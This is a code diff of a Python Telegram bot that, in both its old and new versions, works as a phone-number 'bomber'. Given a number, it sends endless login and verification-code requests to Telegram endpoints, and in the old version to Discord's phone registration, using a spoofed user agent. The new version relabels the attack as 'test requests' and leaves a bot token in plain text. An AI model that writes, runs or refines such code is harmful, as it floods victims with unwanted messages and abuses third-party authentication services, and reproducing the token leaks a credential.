@@ -6,95 +6,87 @@ import threading
 import time
 
 # === Telegram Bot Setup ===
-TOKEN = "8294178048:AAGu4hsFtyVrvw3T3ZiMWm8TjXT_qqiVNFc"   # <-- apna token dalna
+TOKEN = "8294178048:AAGu4hsFtyVrvw3T3ZiMWm8TjXT_qqiVNFc"
 bot = telebot.TeleBot(TOKEN)
 
 # === Fake User Agent ===
 user = fake_useragent.UserAgent().random
 headers = {'user-agent': user}
 
-# === User States (running / stop) ===
-user_states = {}
-
-# === Safe Request Functions ===
-def safe_post(url, data=None):
-    try:
-        r = requests.post(url, headers=headers, data=data, timeout=5)
-        return r.status_code == 200
-    except:
-        return False
-
-def safe_get(url):
-    try:
-        r = requests.get(url, headers=headers, timeout=5)
-        return r.status_code == 200
-    except:
-        return False
-
-# === Bomber Function ===
-def bomber(chat_id, number):
-    count, success, fail = 0, 0, 0
-    user_states[chat_id] = True   # running state ON
-
-    while user_states.get(chat_id, False):
-        # Sequence of APIs
-        if safe_post('https://my.telegram.org/auth/send_password', data={'phone': number}): success += 1
-        else: fail += 1
-
-        if safe_get('https://telegram.org/support?setln=ru'): success += 1
-        else: fail += 1
-
-        if safe_post('https://my.telegram.org/auth/', data={'phone': number}): success += 1
-        else: fail += 1
-
-        if safe_post('https://my.telegram.org/auth/send_password', data={'phone': number}): success += 1
-        else: fail += 1
-
-        if safe_get('https://telegram.org/support?setln=ru'): success += 1
-        else: fail += 1
-
-        if safe_post('https://my.telegram.org/auth/', data={'phone': number}): success += 1
-        else: fail += 1
-
-        if safe_post('https://discord.com/api/v9/auth/register/phone', data={'phone': number}): success += 1
-        else: fail += 1
-
-        count += 1
-        bot.send_message(chat_id, f"📩 Cycle {count} complete for {number}\n✅ Success: {success} | ❌ Fail: {fail}")
-        time.sleep(2)
-
-    bot.send_message(chat_id,
-        f"🛑 Bomber stopped.\n\n📊 Final Report:\n"
-        f"➡️ Total Cycles: {count}\n✅ Success: {success}\n❌ Fail: {fail}"
-    )
+# === Dictionary to keep track of threads and counts per user ===
+user_threads = {}  # chat_id : thread
+user_counts = {}   # chat_id : {'success': x, 'fail': y}
+stop_flags = {}    # chat_id : True/False
 
 # === /start Command ===
 @bot.message_handler(commands=['start'])
 def start(message):
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("❌ STOP")
-    bot.send_message(message.chat.id,
-        "👋 Welcome!\nSend me a phone number to start test requests.\n\nPress ❌ STOP anytime to stop.",
-        reply_markup=markup
-    )
-
-# === STOP Command ===
-@bot.message_handler(func=lambda m: m.text == "❌ STOP")
-def stop_bomber(message):
     chat_id = message.chat.id
-    user_states[chat_id] = False
-    bot.send_message(chat_id, "⏳ Stopping bomber... please wait for summary.")
+    bot.send_message(chat_id,
+                     "Hello! Send me a phone number to start test requests.\n"
+                     "Then click /stop to stop the test.")
+
+# === /stop Command ===
+@bot.message_handler(commands=['stop'])
+def stop(message):
+    chat_id = message.chat.id
+    stop_flags[chat_id] = True
+    bot.send_message(chat_id, "Stop signal received. Stopping your test...")
+
+# === Function to run requests in sequence ===
+def run_requests(chat_id, number):
+    count = {'success': 0, 'fail': 0}
+    stop_flags[chat_id] = False
+
+    while not stop_flags[chat_id]:
+        try:
+            # === Requests sequence ===
+            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
+            requests.get('https://telegram.org/support?setln=ru', headers=headers)
+            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
+            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
+            requests.get('https://telegram.org/support?setln=ru', headers=headers)
+            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
+            # Discord register phone (fake placeholder)
+            # requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': number})
+            
+            count['success'] += 1
+        except Exception as e:
+            count['fail'] += 1
+        
+        # Send periodic update every 5 requests
+        if (count['success'] + count['fail']) % 5 == 0:
+            bot.send_message(chat_id,
+                             f"Progress for {number}:\n"
+                             f"Success: {count['success']}\n"
+                             f"Failed: {count['fail']}")
+        time.sleep(0.5)  # slight delay to avoid super-fast looping
+    
+    bot.send_message(chat_id,
+                     f"Test stopped for {number}.\n"
+                     f"Total Success: {count['success']}\n"
+                     f"Total Failed: {count['fail']}")
 
 # === Phone Number Handler ===
-@bot.message_handler(func=lambda m: m.text.isdigit())
+@bot.message_handler(func=lambda m: True)
 def handle_number(message):
-    number = message.text.strip()
     chat_id = message.chat.id
+    number = message.text.strip()
 
-    # Start thread for bombing
-    t = threading.Thread(target=bomber, args=(chat_id, number))
+    if not number.isdigit():
+        bot.send_message(chat_id, "Please send a valid number.")
+        return
+
+    if chat_id in user_threads and user_threads[chat_id].is_alive():
+        bot.send_message(chat_id, "A test is already running. Please /stop first.")
+        return
+
+    bot.send_message(chat_id, f"Starting test requests for: {number}")
+
+    # Start thread
+    t = threading.Thread(target=run_requests, args=(chat_id, number))
     t.start()
+    user_threads[chat_id] = t
 
 # === Start Polling ===
-print("Bot is running...")
 bot.polling()
